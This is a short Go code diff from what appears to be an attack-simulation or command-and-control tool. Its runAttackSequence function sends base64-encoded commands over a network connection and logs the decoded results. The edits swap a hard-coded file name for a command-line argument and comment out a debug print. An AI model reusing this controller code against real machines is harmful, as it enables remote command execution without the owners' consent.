@@ -135,7 +135,7 @@ func checkFlags(arguments []string, l int, cmdsToRun []string) bool {
 			os.Exit(1)
 		}
 		//check if filepath exists
-		if _, err := os.Stat("sample.txt"); err == nil {
+		if _, err := os.Stat(arguments[2]); err == nil {
 			fmt.Printf("File exists\n")
 		} else {
 			fmt.Printf("File does not exist\n")
@@ -153,7 +153,7 @@ func checkFlags(arguments []string, l int, cmdsToRun []string) bool {
 			os.Exit(1)
 		}
 		//check if filepath exists
-		if _, err := os.Stat("sample.txt"); err != nil {
+		if _, err := os.Stat(arguments[2]); err != nil {
 			fmt.Printf("Filepath does not exist\n")
 			os.Exit(1)
 		}
@@ -175,13 +175,13 @@ func runAttackSequence(conn net.Conn, logger *log.Logger, cmdsToRun []string) {
 	for _, element := range cmdsToRun {
 		element = strings.TrimSpace(element)
 		encodedStr := base64.StdEncoding.EncodeToString([]byte(element))
-		logger.Println("EXECUTE: " + " " + element)
+		logger.Println("EXECUTE: "+ element)
 		_, err := conn.Write([]byte(encodedStr))
 		handleError(err)
 		time.Sleep(time.Second*2)
 		_, err = conn.Read(buffer)
 		decodedStr, _ := base64.StdEncoding.DecodeString(string(buffer[:]))
-		fmt.Println(string(decodedStr[:])) //testing purposes only remove if uncommented
+		// fmt.Println(string(decodedStr[:])) //testing purposes only remove if uncommented
 		logger.Println("RES: " + string(decodedStr[:]))
 		// logger.Println("ERR: " + err.Error())
 	}
